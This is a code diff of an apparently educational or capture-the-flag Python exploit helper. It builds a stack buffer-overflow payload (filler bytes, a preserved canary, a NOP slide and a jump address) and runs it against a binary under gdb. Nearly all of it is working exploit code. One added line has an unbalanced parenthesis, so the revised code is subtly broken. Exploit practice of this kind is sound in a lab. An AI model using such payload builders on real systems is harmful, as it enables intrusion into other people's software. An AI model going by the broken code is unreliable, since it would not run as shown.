@@ -20,14 +20,14 @@ def analyze_binary(binary_path):
         print(f"Failed to analyze binary: {e}")
         exit(1)  #if binary cannot be analyzed
 
-def create_dynamic_payload(canary, return_address):
-    """Create a dynamic payload to target a specific return address, bypassing the canary."""
+def create_dynamic_payload(canary, deadcode_address):
+    """Create a dynamic payload to jump to deadcode, bypassing the canary."""
     buffer_size = 64
     nop_slide = b"\x90" * 16
     payload = b"A" * buffer_size
-    payload += struct.pack("<I", int(canary, 16))  # preserving the canary
+    payload += struct.pack("<I", canary)  # preserving the canary
     payload += nop_slide
-    payload += struct.pack("<I", int(return_address, 16))  # jumping to return address
+    payload += struct.pack("<I", (deadcode_address)  # jumping to return address
     return payload
 
 def gdb_auto_run(binary_path, payload):
@@ -52,7 +52,7 @@ def gdb_auto_run(binary_path, payload):
         f.write(gdb_commands)
 
     gdb_process = subprocess.Popen(['gdb', '-x', gdb_script, binary_path], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    gdb_process.communicate(input=payload.encode('utf-8'))
+    gdb_process.communicate(input=payload)
     gdb_process.wait()
     print("GDB session has completed. Check gdb_script.gdb for details.")
 
